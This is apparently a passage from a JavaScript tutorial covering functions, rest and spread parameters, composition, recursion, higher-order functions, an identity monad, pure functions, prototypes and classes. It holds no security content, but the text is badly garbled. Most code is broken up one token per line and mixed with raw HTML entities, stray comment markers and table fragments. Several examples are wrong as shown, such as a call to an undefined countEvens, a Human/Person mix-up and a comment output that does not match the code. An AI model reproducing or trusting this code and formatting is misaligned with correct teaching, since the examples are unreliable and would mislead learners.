As primitive valued arguments, like numbers or strings, are immutable,
there is no way for a function to mutate them:

**var**

s

=

&apos;say&apos;

;

**function**

myfunc

(

arg

)

{

arg

+=

&apos; hello&apos;

;

*// assignment to the parameter variable itself*

}

myfunc

(

s

)

;

console.

log

(

s

)

;

*// &apos;say&apos;*

When a function wants to mutate an object passed as argument, but does
not want to actually mutate the caller&apos;s object, the argument
variable should be reassigned:

Version ≥ 6

**var**

obj

=

{

a

:

2

,

b

:

3

}

;

**function**

myfunc

(

arg

)

{

arg

=

Object

.

assign

(

{

}

,

arg

)

;

*// assignment to argument variable, shallow copy*

arg.

a

=

5

;

}

myfunc

(

obj

)

;

console.

log

(

obj.

a

)

;

*// 2*

As an alternative to in-place mutation of an argument, functions can
create a new value, based on the argument, and return it. The caller
can then assign it, even to the original variable that was passed as
argument:

**var**

a

=

2

;

**function**

myfunc

(

arg

)

{

arg

++

;

**return**

arg

;

}

a

=

myfunc

(

a

)

;

console.

log

(

obj.

a

)

;

*// 3*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch19-12">Section 19.12: Function Arguments, &quot;arguments&quot; object, rest and spread parameters</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Functions can take inputs in form of variables that can be used and
assigned inside their own scope. The following function takes two
numeric values and returns their sum:

**function**

addition

(

argument1

,

argument2

)

{

**return**

argument1

&plus;

argument2

;

}

console.

log

(

addition

(

2

,

3

)

)

;

*// -&bsol;5*

**arguments**

**object**

The arguments object contains all the function&apos;s parameters that
contain a non-default value. It can also be used even if the
parameters are not explicitly declared:
>
(**function**() { console.log(arguments) })(0,&apos;str&apos;, &lbrack;2,{3}&rbrack;) *//
-&amp;lbrack;0, &quot;str&quot;, Array&lbrack;2&rbrack;&rbrack;* Although when printing arguments the
output resembles an Array, it is in fact an object:

(

**function**

(

)

{

console.

log

(

**typeof**

arguments

)

}

)

(

)

;

*// -&bsol;object*

**Rest parameters:**

**function**

**(**

**&hellip;**

**parm**

**)**

**{**

**}**

In ES6, the &hellip; syntax when used in the declaration of a function&apos;s
parameters transforms the variable to its right into a single object
containing all the remaining parameters provided after the declared
ones. This allows the function to be invoked with an unlimited number
of arguments, which will become part of this variable:

*// -&bsol;object: 123*

(

**function**

(

a

,

&hellip;

b

)

{

console.

log

(

**typeof**

b

&plus;

&apos;: &apos;

&plus;

b

&lbrack;

0

&rbrack;

&plus;

b

&lbrack;

1

&rbrack;

&plus;

b

&lbrack;

2

&rbrack;

)

}

)

(

0

,

1

,

&apos;2&apos;

,

&lbrack;

3

&rbrack;

,

{

i

:

4

}

)

;

  
  **function_name**                           **(**   **&hellip;varb**
   - 

  

**Spread parameters: );**
>
In ES6, the &hellip; syntax can also be used when invoking a function by
placing an object/variable to its right. This allows that object&apos;s
elements to be passed into that function as a single object:

**let**

nums

=

&lbrack;

2

,

42

,-

1

&rbrack;

;

console.

log

(

&hellip;

&lbrack;

&apos;a&apos;

,

&apos;b&apos;

,

&apos;c&apos;

&rbrack;

,

Math

.

max

(

&hellip;

nums

)

)

;

*// -&bsol;a b c 42*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch19-13">Section 19.13: Function Composition</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Composing multiple functions into one is a functional programming
common practice;

composition makes a pipeline through which our data will transit and
get modified simply working on the functioncomposition (just like
snapping pieces of a track together)&hellip;

you start out with some single responsibility functions:

Version ≥ 6 **const** capitalize = x =&bsol;x.replace(*/&Hat;&bsol;&bsol;w/*, m =&gt;
m.toUpperCase()); **const** sign = x =&bsol;x + &apos;,**&bsol;&bsol;n**made with love&apos;;

and easily create a transformation track: Version ≥ 6

**const**

formatText

=

compose

(

capitalize

,

sign

)

;

formatText

(

&apos;this is an example&apos;

)

*//This is an example,*

*//made with love*

N.B. Composition is achieved through a utility function usually called
compose as in our example.
>
Implementation of compose are present in many JavaScript utility
libraries ([lodash](https://lodash.com/docs#flow),
[rambda](http://ramdajs.com/), etc.) but you can also start out with a
simple implementation such as:

Version ≥ 6

**const**

compose

=

(

&hellip;

funs

)

=&gt;

x

=&gt;

funs.

reduce

(

(

ac

,

f

)

=&gt;

f

(

ac

)

,

x

)

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch19-14">Section 19.14: Get the name of a function object</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
<h5>Version ≥ 6 <b>ES6</b>:</h5>
myFunction.
name
[Explanation on
MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/name).
As of 2015 works in Node.js and all major browsers except IE.

<h5>Version ≥ 5</h5>
**ES5**:

If you have a reference to the function, you can do:
**function**
functionName
(
func
)
{
*// Match:*
*// - &Hat; the beginning of the string*
*// - function the word &apos;function&apos;*
*// - &bsol;&bsol;s+ at least some white space*
*// - (&lbrack;&bsol;&bsol;w&bsol;&amp;dollar;&rbrack;+) capture one or more valid JavaScript identifier
characters*
*// - &amp;lpar; followed by an opening brace*
*//*
**var**
result
=
*/&Hat;function&bsol;&bsol;s+(&lbrack;&bsol;&bsol;w&bsol;&amp;dollar;&rbrack;+)&amp;lpar;/*

.

exec

(

func.

toString

(

)

)

**return**

result

?

result

&lbrack;

1

&rbrack;

:

&apos;&apos;

}

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch19-15">Section 19.15: Recursive Function</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
A recursive function is simply a function, that would call itself.

**function**

factorial

(

n

)

{

**if**

(

n

&lt;=

1

)

{

**return**

1

;

}

**return**

n

&ast;

factorial

(

n

&minus;

1

)

;

}

The above function shows a basic example of how to perform a recursive
function to return a factorial.
>
Another example, would be to retrieve the sum of even numbers in an
array.

**function**

countEvenNumbers

(

arr

)

{

*// Sentinel value. Recursion stops on empty array.*

**if**

(

arr.

length

&lt;

1

)

{

**return**

0

;

}

*// The shift() method removes the first element from an array*

*// and returns that element. This method changes the length of the
array.*

**var**

value

=

arr.

shift

(

)

;

*// &grave;value % 2 === 0&grave; tests if the number is even or odd*

*// If it&apos;s even we add one to the result of counting the remainder of*

*// the array. If it&apos;s odd, we add zero to it.*

**return**

(

(

value

&percnt;

2

===

0

)

?

1

:

0

)

&plus;

countEvens

(

arr

)

;

}

It is important that such functions make some sort of sentinel value
check to avoid infinite loops. In the first example above, when n is
less than or equal to 1, the recursion stops, allowing the result of
each call to be returned back up the call stack.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch19-16">Section 19.16: Using the Return Statement</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
The return statement can be a useful way to create output for a
function. The return statement is especially useful if you do not know
in which context the function will be used yet.

*//An example function that will take a string as input and return*

*//the first character of the string.*

**function**

firstChar

(

stringIn

)

{

**return**

stringIn.

charAt

(

0

)

;

}

Now to use this function, you need to put it in place of a variable
somewhere else in your code:
>
**Using the function result as an argument for another function:**

console.

log

(

firstChar

(

&quot;Hello world&quot;

)

)

;

*Console output will be:*

&gt;

H

**The return statement ends the function**
>
If we modify the function in the beginning, we can demonstrate that
the return statement ends the function.

**function**

firstChar

(

stringIn

)

{

console.

log

(

&quot;The first action of the first char function&quot;

)

;

**return**

stringIn.

charAt

(

0

)

;

console.

log

(

&quot;The last action of the first char function&quot;

)

;

}

Running this function like so will look like this:

console.

log

(

firstChar

(

&quot;JS&quot;

)

)

;

*Console output:*

&gt;

The first action of the first

char

**function**

&gt;

J

It will not print the message after the return statement, as the
function has now been ended.
>
**Return statement spanning multiple lines:**
>
In JavaScript, you can normally split up a line of code into many
lines for readability purposes or organization. This is valid
JavaScript:

**var**

name

=

&quot;bob&quot;

,

age

=

18

;

When JavaScript sees an incomplete statement like **var** it looks to
the next line to complete itself. However, if you make the same
mistake with the **return** statement, you will not get what you
expected.

**return**

&quot;Hi, my name is &quot;

&plus;

name

&plus;

&quot;. &quot;

&plus;

&quot;I&apos;m &quot;

&plus;

age

&plus;

&quot; years old.&quot;

;

This code will return **undefined** because **return** by itself is a
complete statement in JavaScript, so it will not look to the next line
to complete itself. If you need to split up a **return** statement
into multiple lines, put a value next to return before you split it
up, like so.

**return**

&quot;Hi, my name is &quot;

&plus;

name

&plus;

&quot;. &quot;

&plus;

&quot;I&apos;m &quot;

&plus;

age

&plus;

&quot; years old.&quot;

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch19-17">Section 19.17: Functions as a variable</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
A normal function declaration looks like this:
**function**
foo
(
)
{
}
A function defined like this is accessible from anywhere within its
context by its name. But sometimes it can be useful to treat function
references like object references. For example, you can assign an
object to a variable based on some set of conditions and then later
retrieve a property from one or the other object:
**var**
name
=
&apos;Cameron&apos;
;
**var**
spouse
;
**if**
(
name
===
&apos;Taylor&apos;
)
spouse
=
{
name
:
&apos;Jordan&apos;
}
;
**else**
**if**
(
name
===
&apos;Cameron&apos;
)
spouse
=
{
name
:
&apos;Casey&apos;
}
;
**var**
spouseName
=
spouse.
name
;
In JavaScript, you can do the same thing with functions:
*// Example 1*
**var**
hashAlgorithm
=
&apos;sha1&apos;
;
**var**
hash
;
**if**
(
hashAlgorithm
===
&apos;sha1&apos;
)
hash
=
**function**
(
value
)
{
*/&ast;&hellip;&ast;/*
}
;
**else**
**if**
(
hashAlgorithm
===
&apos;md5&apos;
)
hash
=
**function**
(
value
)
{
*/&ast;&hellip;&ast;/*
}
;
hash
(
&apos;Fred&apos;
)
;
In the example above, hash is a normal variable. It is assigned a
reference to a function, after which the function it references can be
invoked using parentheses, just like a normal function declaration.

The example above references anonymous functions&hellip; functions that do
not have their own name. You can also use variables to refer to named
functions. The example above could be rewritten like so:
*// Example 2*
**var**
hashAlgorithm
=
&apos;sha1&apos;
;
**var**
hash
;
**if**
(
hashAlgorithm
===
&apos;sha1&apos;
)
hash
=
sha1Hash
;
**else**
**if**
(
hashAlgorithm
===
&apos;md5&apos;
)
hash
=
md5Hash
;
hash
(
&apos;Fred&apos;
)
;
**function**
md5Hash
(
value
)
{
*// &hellip;*
}
**function**
sha1Hash
(
value
)
{
*// &hellip;*
}
Or, you can assign function references from object properties:
*// Example 3*
**var**
hashAlgorithms
=
{
sha1
:
**function**
(
value
)
{
*/&ast;&ast;/*
}
,
md5
:
**function**
(
value
)
{
*/&ast;&ast;/*
}
}
;
**var**
hashAlgorithm
=
&apos;sha1&apos;
;
**var**
hash
;
**if**
(
hashAlgorithm
===
&apos;sha1&apos;
)
hash
=
hashAlgorithms.
sha1
;
**else**
**if**
(

hashAlgorithm

===

&apos;md5&apos;

)

hash

=

hashAlgorithms.

md5

;

hash

(

&apos;Fred&apos;

)

;

You can assign the reference to a function held by one variable to
another by omitting the parentheses. This can result in an
easy-to-make mistake: attempting to assign the return value of a
function to another variable, but accidentally assigning the reference
to the function.

*// Example 4*

**var**

a

=

getValue

;

**var**

b

=

a

;

*// b is now a reference to getValue.*

**var**

c

=

b

(

)

;

*// b is invoked, so c now holds the value returned by getValue (41)*

**function** getValue(){ **return** 41; }
>
A reference to a function is like any other value. As you&apos;ve seen, a
reference can be assigned to a variable, and that variable&apos;s
reference value can be subsequently assigned to other variables. You
can pass around references to functions like any other value,
including passing a reference to a function as the return value of
another function. For example:

*// Example 5*

*// getHashingFunction returns a function, which is assigned*

*// to hash for later use:*

**var**

hash

=

getHashingFunction

(

&apos;sha1&apos;

)

;

*// &hellip;*

hash

(

&apos;Fred&apos;

)

;

*// return the function corresponding to the given algorithmName*

**function**

getHashingFunction

(

algorithmName

)

{

*// return a reference to an anonymous function*

**if**

(

algorithmName

===

&apos;sha1&apos;

)

**return**

**function**

(

value

)

{

*/&ast;&ast;/*

}

;

*// return a reference to a declared function*

**else**

**if**

(

algorithmName

===

&apos;md5&apos;

)

**return**

md5

;

}

**function**

md5Hash

(

value

)

{

*// &hellip;*

}

You don&apos;t need to assign a function reference to a variable in order
to invoke it. This example, building off example 5, will call
getHashingFunction and then immediately invoke the returned function
and pass its return value to hashedValue.

*// Example 6*

**var**

hashedValue

=

getHashingFunction

(

&apos;sha1&apos;

)

(

&apos;Fred&apos;

)

;

**A Note on Hoisting**
>
Keep in mind that, unlike normal function declarations, variables that
reference functions are not &quot;hoisted&quot;. In example 2, the md5Hash and
sha1Hash functions are defined at the bottom of the script, but are
available everywhere immediately. No matter where you define a
function, the interpreter &quot;hoists&quot; it to the top of its scope,
making it immediately available. This is **not** the case for variable
definitions, so code like the following will break:

**var**

functionVariable

;

hoistedFunction

(

)

;

*// works, because the function is &quot;hoisted&quot; to the top of its scope*

functionVariable

(

)

;

*// error: undefined is not a function.*

**function**

hoistedFunction

(

)

{

}

functionVariable

=

**function**

(

)

{

}

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch20">Chapter 20: Functional JavaScript</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch20-1">Section 20.1: Higher-Order Functions</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
In general, functions that operate on other functions, either by
taking them as arguments or by returning them (or both), are called
higher-order functions.
A higher-order function is a function that can take another function
as an argument. You are using higher-order functions when passing
callbacks.
**function**
iAmCallbackFunction
)
{
console.
log
(
&quot;callback has been invoked&quot;
)
;
}
**function**
iAmJustFunction
(
callbackFn
)
{
*// do some stuff &hellip;*
*// invoke the callback function.*
callbackFn
(
)
;
}
*// invoke your higher-order function with a callback function.*
iAmJustFunction
(
iAmCallbackFunction
)
;
A higher-order function is also a function that returns another
function as its result.
**function**
iAmJustFunction
(
)
{
*// do some stuff &hellip;*
*// return a function.*
**return**
**function**
iAmReturnedFunction
(
)
{
console.
log
(
&quot;returned function has been invoked&quot;
)
;
}
}
*// invoke your higher-order function and its returned function.*
iAmJustFunction
(
)
(
)
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch20-2">Section 20.2: Identity Monad</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
This is an example of an implementation of the identity monad in
JavaScript, and could serve as a starting point to create other
monads.
Based on the [conference by Douglas Crockford on monads and
gonads](https://www.youtube.com/watch?v=b0EF0VTs9Dc)
Using this approach reusing your functions will be easier because of
the flexibility this monad provides, and composition nightmares:
f
(
g
(
h
(
i
(
j
(
k
(
value
)
,
j1
)
,
i2
)
,
h1
,
h2
)
,
g1
,
g2
)
,
f1
,
f2
)
readable, nice and clean:
identityMonad
(
value
)
.
bind
(
k
)
.
bind
(
j
,
j1
,
j2
)
.
bind
(
i
,
i2
)
.bind(h, h1, h2)
.bind(g, g1, g2)
.bind(f, f1, f2);
**function**
identityMonad
(
value
)
{
**var**
monad
=
Object
.
create
(
**null**
)
;
*// func should return a monad*
monad.
bind
=
**function**
(
func
,
&hellip;
args
)
{
**return**
func
(
value
,
&hellip;
args
)
;
}
;
*// whatever func does, we get our monad back*
monad.
call
=
**function**
(
func
,
&hellip;
args
)
{
func
(
value
,
&hellip;
args
)
;
**return**
identityMonad

(

value

)

;

}

;

*// func doesn&apos;t have to know anything about monads*

monad.

apply

=

**function**

(

func

,

&hellip;

args

)

{

**return**

identityMonad

(

func

(

value

,

&hellip;

args

)

)

;

}

;

*// Get the value wrapped in this monad*

monad.

value

=

**function**

(

)

{

**return**

value

;

}

;

**return**

monad

;

}

;

It works with primitive values

**var**

value

=

&apos;foo&apos;

,

f

=

x

=&gt;

x

&plus;

&apos; changed&apos;

,

g

=

x

=&gt;

x

&plus;

&apos; again&apos;

;

identityMonad

(

value

)

.

apply

(

f

)

.

apply

(

g

)

.

bind

(

alert

)

;

*// Alerts &apos;foo changed again&apos;*

And also with objects

**var**

value

=

{

foo

:

&apos;foo&apos;

}

,

f

=

x

=&gt;

identityMonad

(

Object

.

assign

(

x

,

{

foo

:

&apos;bar&apos;

}

)

)

,

g

=

x

=&gt;

Object

.

assign

(

x

,

{

bar

:

&apos;foo&apos;

}

)

,

h

=

x

=&gt;

console.

log

(

&apos;foo: &apos;

&plus;

x&period;

foo

&plus;

&apos;, bar: &apos;

&plus;

x&period;

bar

)

;

identityMonad

(

value

)

.

bind

(

f

)

.

apply

(

g

)

.

bind

(

h

)

;

*// Logs &apos;foo: bar, bar: foo&apos;*

Let&apos;s try everything:
>
**var** add = (x, &hellip;args) =&bsol;x + args.reduce((r, n) =&bsol;r + n, 0),
multiply = (x, &hellip;args) =&bsol;x &ast; args.reduce((r, n) =&bsol;r &ast; n, 1),

divideMonad

=

(

x

,

&hellip;

args

)

=&gt;

identityMonad

(

x

/

multiply

(

&hellip;

args

)

)

,

log

=

x

=&gt;

console.

log

(

x

)

,

substract

=

(

x

,

&hellip;

args

)

=&gt;

x

&minus;

add

(

&hellip;

args

)

;

identityMonad

(

100

)

.

apply

(

add

,

10

,

29

,

13

)

.

apply

(

multiply

,

2

)

.

bind

(

divideMonad

,

2

)

.

apply

(

substract

,

67

,

34

)

.

apply

(

multiply

,

1239
)
.
bind
(
divideMonad
,
20
,
54
,
2
)
.
apply
(
Math
.
round
)
.
call
(
log
)
;
*// Logs 29*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch20-3">Section 20.3: Pure Functions</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
A basic principle of functional programming is that it **avoids
changing** the application state (statelessness) and variables outside
its scope (immutability).
Pure functions are functions that:
with a given input, always return the same output they do not rely on
any variable outside their scope
they do not modify the state of the application (**no side effects**)
Let&apos;s take a look at some examples:
Pure functions must not change any variable outside their scope
**Impure function**
**let**
obj
=
{
a
:
0
}
**const**
impure
=
(
input
)
=&gt;
{
*// Modifies input.a*
input.
a
=
input.
a
&plus;
1
;
**return**
input.
a
;
}
**let**
b
=
impure
(
obj
)
console.
log
(
obj
)
*// Logs { &quot;a&quot;: 1 }*
console.
log
(
b
)
*// Logs 1*
obj.

The function changed the a value that is outside its scope.

**Pure function**
**let**
obj
=
{
a
:
0
}
**const**
pure
=
(
input
)
=&gt;
{
*// Does not modify obj*
**let**
output
=
input.
a
&plus;
1
;
**return**
output
;
}
**let** b = pure(obj) console.log(obj) *// Logs { &quot;a&quot;: 0 }*
console.log(b) *// Logs 1*
The function did not change the object obj values
Pure functions must not rely on variables outside their scope
**Impure function**
**let**
a
=
1
;
**let**
impure
=
(
input
)
=&gt;
{
*// Multiply with variable outside function scope*
**let**
output
=
input
&ast;
a
;
**return**
output
;
}
console.
log
(
impure
(
2
)
)
*// Logs 2*
a
++
;
*// a becomes equal to 2*
console.
log
(
impure
(
2
)
)
*// Logs 4*
This **impure** function rely on variable a that is defined outside
its scope. So, if a is modified, impure&apos;s function result will be
different.

**Pure function**
**let**
pure
=
(
input
)
=&gt;
{
**let**
a
=
1
;
*// Multiply with variable inside function scope*
**let**
output
=
input
&ast;
a
;
**return**
output
;
}
console.
log
(
pure
(
2
)
)
*// Logs 2*
The pure&apos;s function result **does not rely** on any variable outside
its scope.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch20-4">Section 20.4: Accepting Functions as Arguments</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
**function**
transform
(
fn
,
arr
)
{
**let**
result
=
&lbrack;
&rbrack;
;
**for**
(
**let**
el of arr
)

{

result.

push

(

fn

(

el

)

)

;

*// We push the result of the transformed item to result*

}

**return**

result

;

}

console.

log

(

transform

(

x

=&gt;

x

&ast;

2

,

&lbrack;

1

,

2

,

3

,

4

&rbrack;

)

)

;

*// &lbrack;2, 4, 6, 8&rbrack;*

As you can see, our transform function accepts two parameters, a
function and a collection. It will then iterate the collection, and
push values onto the result, calling fn on each of them.

  -
  Array              .   **prototype**                     .   map
  -    

  -

Looks familiar? This is very similar to how () works!

console.

log

(

&lbrack;

1

,

2

,

3

,

4

&rbrack;

.

map

(

x

=&gt;

x

&ast;

2

)

)

;

*// &lbrack;2, 4, 6, 8&rbrack;*

<h2 id="ch21">Chapter 21: Prototypes, objects</h2>

In the conventional JS there are no class instead we have prototypes.
Like the class, prototype inherits the properties including the
methods and the variables declared in the class. We can create the new
instance of the object whenever it is necessary by,
Object.create(PrototypeName); (we can give the value for the
constructor as well)

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch21-1">Section 21.1: Creation and initialising Prototype</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
**var**
Human
=
**function**
(
)
{
**this**
.
canWalk
=
**true**
;
**this**
.

canSpeak

=

**true**

;

*//*

}

;

Person.

**prototype**

.

greet

=

**function**

(
)
{
**if**
(
**this**
.
canSpeak
)
{
*// checks whether this prototype has instance of speak*
**this**
.
name
=
&quot;Steve&quot;
console.
log
(
&apos;Hi, I am &apos;
&plus;
**this**
.
name
)
;
}
**else**
{
console.
log
(
&apos;Sorry i can not speak&apos;
)
;
}
}
;
The prototype can be instantiated like this
obj
=
Object
.
create
(
Person.
**prototype**
)
;
ob.
greet
(
)
;
We can pass value for the constructor and make the boolean true and
false based on the requirement.

Detailed Explanation
**var**
Human
=
**function**
(
)
{
**this**
.
canSpeak
=
**true**
;
}
;
*// Basic greet function which will greet based on the canSpeak flag*
Human.
**prototype**
.
greet
=
**function**
(
)
{
**if**
(
**this**
.
canSpeak
)
{
console.
log
(
&apos;Hi, I am &apos;
&plus;
**this**
.
name
)
;
}
}
;
**var**
Student
=
**function**
(
name
,
title
)
{
Human.
call
(
**this**
)
;
*// Instantiating the Human object and getting the memebers of the
class*
**this**
.
name
=
name
;
*// inheriting the name from the human class*
**this**
.
title
=
title
;
*// getting the title from the called function*
}
;
Student.
**prototype**
=
Object
.
create
(
Human.
**prototype**
)
;
Student.
**prototype**
.
constructor
=
Student
;
Student.
**prototype**
.
greet
=
**function**
(
)
{
**if**
(
**this**
.
canSpeak
)
{
console.
log
(
&apos;Hi, I am &apos;
&plus;
**this**
.
name
&plus;
&apos;, the &apos;
&plus;
**this**
.
title
)
;
}
}
;
**var**
Customer
=
**function**
(
name
)
{
Human.
call
(
**this**
)
;
*// inheriting from the base class*
**this**
.
name
=
name
;
}
;
Customer.
**prototype**
=
Object
.
create
(
Human.
**prototype**
)
;
*// creating the object*
Customer.
**prototype**
.
constructor
=
Customer
;
**var**
bill
=
**new**
Student
(
&apos;Billy&apos;
,
&apos;Teacher&apos;
)
;
**var**
carter
=
**new**
Customer
(
&apos;Carter&apos;
)
;
**var**
andy
=
**new**
Student
(
&apos;Andy&apos;
,
&apos;Bill&apos;
)

;

**var**

virat

=

**new**

Customer

(

&apos;Virat&apos;

)

;

bill.

greet

(

)

;

*// Hi, I am Bob, the Teacher*

carter.

greet

(

)

;

*// Hi, I am Carter*

andy.

greet

(

)

;

*// Hi, I am Andy, the Bill*

virat.

greet

(

)

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch22">Chapter 22: Classes</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch22-1">Section 22.1: Class Constructor</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--

The fundamental part of most classes is its constructor, which sets up
each instance&apos;s initial state and handles any parameters that were
passed when calling **new**.
>
It&apos;s defined in a class block as though you&apos;re defining a method
named constructor, though it&apos;s actually handled as a special case.

class

MyClass

{

constructor

(

option

)

{

console.

log

(

&grave;Creating instance using &dollar;

{

option

}

option.&grave;

)

;

**this**

.

option

=

option

;

}

}

Example usage: **const** foo = **new** MyClass(&apos;speedy&apos;); *// logs:
&quot;Creating instance using speedy option&quot;*

A small thing to note is that a class constructor cannot be made
static via the **static** keyword, as described below for other
methods.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch22-2">Section 22.2: Class Inheritance</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--

Inheritance works just like it does in other object-oriented
languages: methods defined on the superclass are accessible in the
extending subclass.

  
  super
  

  

If the subclass declares its own constructor then it must invoke the
parents constructor via () before it can access **this**.

class

SuperClass

{

constructor

(

)

{

**this**

.

logger

=

console.

log

;

}

log

(

)

{

**this**

.

logger

(

&grave;Hello &dollar;

{

**this**

.

name

}

&grave;

)

;

}

}

class

SubClass

extends

SuperClass

{

constructor

(

)

{

super

(

)

;

**this**

.

name

=

&apos;subclass&apos;

;

}

}

**const**

subClass

=

**new**

SubClass

(

)

;

subClass.

log

(

)

;

*// logs: &quot;Hello subclass&quot;*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch22-3">Section 22.3: Static Methods</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--

Static methods and properties are defined on *the class/constructor
itself*, not on instance objects. These are specified in a class
definition by using the **static** keyword.

class

MyClass

{

**static**

myStaticMethod

(

)

{

**return**

&apos;Hello&apos;

;

}

**static**

**get**

myStaticProperty

(

)

{

**return**

&apos;Goodbye&apos;

;

}

}

console.

log

(

MyClass.

myStaticMethod

(

)

)

;

*// logs: &quot;Hello&quot;*

console.

log

(

MyClass.

myStaticProperty

)

;

*// logs: &quot;Goodbye&quot;*

We can see that static properties are not defined on object instances:

**const**

myClassInstance

=

**new**

MyClass

(

)

;

console.

log

(

myClassInstance.

myStaticProperty

)

;

*// logs: undefined*

However, they *are* defined on subclasses:

class

MySubClass

extends

MyClass

{

}

;

console.

log

(

MySubClass.

myStaticMethod

(

)

)

;

*// logs: &quot;Hello&quot;*

console.

log

(

MySubClass.

myStaticProperty

)

;

*// logs: &quot;Goodbye&quot;*

